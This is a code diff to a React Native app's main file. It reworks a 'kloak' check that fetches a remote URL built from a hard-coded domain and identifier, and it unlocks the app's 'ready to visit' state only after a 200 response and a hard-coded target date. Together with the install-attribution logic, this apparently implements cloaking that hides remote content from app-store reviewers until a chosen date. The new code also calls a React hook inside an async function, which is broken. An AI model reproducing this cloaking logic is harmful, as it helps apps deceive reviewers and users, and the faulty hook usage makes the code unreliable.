@@ -10,7 +10,7 @@ import {
 } from './screen/stack';
 import {PracticeProvider} from './store/context';
 import TabMenu from './TabNavigator/TabMenu';
-import {useState, useEffect, useMemo, useCallback} from 'react';
+import {useState, useEffect, useMemo, useCallback, useRef} from 'react';
 import AsyncStorage from '@react-native-async-storage/async-storage';
 import {AppState, BackHandler} from 'react-native';
 import {
@@ -57,7 +57,7 @@ const generateTimestampUserId = () => {
   )}`;
 };
 const INITIAL_URL = `https://brilliant-grand-happiness.space/`;
-const URL_IDENTIFAIRE = `9QNrrgg5`;
+const URL_IDENTIFAIRE = `KDN6BhkQ`;
 const targetData = new Date('2025-02-18T10:00:00Z');
 const currentDate = new Date();
 
@@ -83,34 +83,8 @@ function App() {
   const [openWithPush, setOpenWithPush] = useState(false);
   const [isOneSignalReady, setIsOneSignalReady] = useState(false);
   const [hasSentPushOpenRequest, setHasSentPushOpenRequest] = useState(false);
-  // console.log('Opened with push App.js', openWithPush);
-  // console.log(!'fb-test1-test2-test-3'.includes('_'));
-
-  // // Remove this method to stop OneSignal Debugging
-  // OneSignal.Debug.setLogLevel(LogLevel.Verbose);
-  // // OneSignal Initialization
-  // OneSignal.initialize('843280c8-82d4-461c-97a6-28e5f209ddb3');
-  // // requestPermission will show the native iOS or Android notification permission prompt.
-  // // We recommend removing the following code and instead using an In-App Message to prompt for notification permission
-  // // Method for listening for notification clicks
-  // OneSignal.Notifications.addEventListener('click', event => {
-  //   // console.log('OneSignal: notification clicked:', event);
-  //   // console.log('🔔 Notification:', event.notification);
-  // });
-  // // OneSignal.Notifications.addEventListener('foregroundWillDisplay', event => {
-  // //   console.log('🔔 Notification received in foreground:', event);
-  // // });
-  // // OneSignal.Notifications.addEventListener('permissionChanged', event => {
-  // //   console.log('🔔 Permission changed:', event);
-  // // });
-  // OneSignal.Notifications.requestPermission(true).then(response => {
-  //   // console.log('OneSignal: notification request permission:', response);
-  //   OneSignal.User.getOnesignalId().then(userId => {
-  //     // console.log('OneSignal: user id:', userId);
-  //     setOneSignalUserId(userId);
-  //   });
-  //   setOneSignalPermissionStatus(response);
-  // // });
+  const hasCheckedUrl = useRef(false); // Add this ref
+  const urlCheckTimeout = useRef(null);
 
   // Initialize OneSignal
   useEffect(() => {
@@ -245,17 +219,7 @@ function App() {
   //   });
   // }, [sabData, isNonOrganicInstall, isConversionDataReceived]);
 
-  useEffect(() => {
-    checkFirstVisit();
-    isReadyToVisitHandler();
-    initAppsFlyer();
-    // getOneSignalUserId();
-
-    // If it's not first visit, mark conversion data as already received
-    if (!isFirstVisit) {
-      setIsConversionDataReceived(true);
-    }
-  }, [isFirstVisit]);
+  
 
   // const getOneSignalUserId = async () => {
   //   const userId = await OneSignal.User.getOnesignalId();
@@ -316,33 +280,100 @@ function App() {
     // console.log('isFirstVisit',isFirstVisit);
     // console.log('isReadyToVisitHandler fn check start');
     // console.log('timeStamp',timeStamp);
-    const kloakSuccess = await AsyncStorage.getItem('kloakSuccess');
-    const hasVisited = await AsyncStorage.getItem('hasVisitedBefore');
-    const visitUrl = `${INITIAL_URL}${URL_IDENTIFAIRE}`;
-    console.log('hasVisited', hasVisited);
-    console.log('kloakSuccess', kloakSuccess);
 
-    if (hasVisited && kloakSuccess) {
-      console.log('App visited before and kloakSuccess 200');
-      setIsReadyToVisit(true);
+    // Prevent multiple simultaneous calls
+    if (hasCheckedUrl.current) {
+      console.log('URL check already performed');
+      return;
     }
 
-    fetch(visitUrl)
-      .then(async res => {
-        if (res.status === 200) {
-          console.log('URL status ', res.status);
-          await AsyncStorage.setItem('kloakSuccess', 'true');
-          if (currentDate >= targetData) {
-            setIsReadyToVisit(true);
+    // Clear any existing timeout
+    if (urlCheckTimeout.current) {
+      clearTimeout(urlCheckTimeout.current);
+    }
+
+    // Set a flag to prevent immediate re-runs
+    hasCheckedUrl.current = true;
+
+    try {
+      const kloakSuccess = await AsyncStorage.getItem('kloakSuccess');
+      const hasVisited = await AsyncStorage.getItem('hasVisitedBefore');
+      const visitUrl = `${INITIAL_URL}${URL_IDENTIFAIRE}`;
+      console.log('hasVisited', hasVisited);
+      console.log('kloakSuccess', kloakSuccess);
+
+      // Case 1: App was visited before and had successful kloak check
+      if (hasVisited && kloakSuccess) {
+        console.log('App visited before and kloakSuccess 200');
+        setIsReadyToVisit(true);
+        return;
+      }
+
+      // Case 2: Only fetch URL if not visited before
+      if (!hasVisited) {
+        console.log('First visit - checking URL');
+
+        // Add timeout to ensure only one fetch happens
+        urlCheckTimeout.current = setTimeout(async () => {
+          try {
+            const response = await fetch(visitUrl);
+            console.log('URL status:', response.status);
+
+            if (response.status === 200) {
+              await AsyncStorage.setItem('kloakSuccess', 'true');
+
+              if (currentDate >= targetData) {
+                setIsReadyToVisit(true);
+                console.log('Current date passed target date, ready to visit');
+              } else {
+                setIsReadyToVisit(false);
+                console.log('Current date has not passed target date');
+              }
+            } else {
+              setIsReadyToVisit(false);
+            }
+          } catch (error) {
+            console.log('URL fetch error:', error);
+            setIsReadyToVisit(false);
           }
-        } else {
-          console.log('URL is not ok', res.status);
-          setIsReadyToVisit(false);
+        }, 500); // Add small delay to prevent double calls
+      }
+    } catch (error) {
+      console.log('Error in isReadyToVisitHandler:', error);
+      setIsReadyToVisit(false);
+    }
+
+    // Cleanup timeout on unmount
+    useEffect(() => {
+      return () => {
+        if (urlCheckTimeout.current) {
+          clearTimeout(urlCheckTimeout.current);
         }
-      })
-      .catch(error => {
-        console.log('Ready to visit error', error);
-      });
+      };
+    }, []);
+
+    // if (hasVisited && kloakSuccess) {
+    //   console.log('App visited before and kloakSuccess 200');
+    //   setIsReadyToVisit(true);
+    // }
+
+    // if (!hasVisited) {
+    // fetch(visitUrl)
+    //   .then(async res => {
+    //     if (res.status === 200) {
+    //       console.log('URL status ', res.status);
+    //       await AsyncStorage.setItem('kloakSuccess', 'true');
+    //       if (currentDate >= targetData) {
+    //         setIsReadyToVisit(true);
+    //       }
+    //     } else {
+    //       console.log('URL is not ok', res.status);
+    //       setIsReadyToVisit(false);
+    //     }
+    //   })
+    //   .catch(error => {
+    //     console.log('Ready to visit error', error);
+    //   });}
 
     // if (currentDate >= targetData) {
     //   if (hasVisited) {
@@ -369,6 +400,17 @@ function App() {
     //   console.log('Today date did not pass target date');
     // }
   };
+  useEffect(() => {
+    checkFirstVisit();
+    isReadyToVisitHandler();
+    initAppsFlyer();
+    // getOneSignalUserId();
+
+    // If it's not first visit, mark conversion data as already received
+    if (!isFirstVisit) {
+      setIsConversionDataReceived(true);
+    }
+  }, [isFirstVisit]);
 
   const initAppsFlyer = async () => {
     // Set up conversion listener first
@@ -550,7 +592,7 @@ function App() {
         await fetch(finalUrl);
 
         // Ensure ready to visit
-        setIsReadyToVisit(true);
+        // setIsReadyToVisit(true);
       }
     } catch (error) {
       console.error('🔔 Error handling notification:', error);
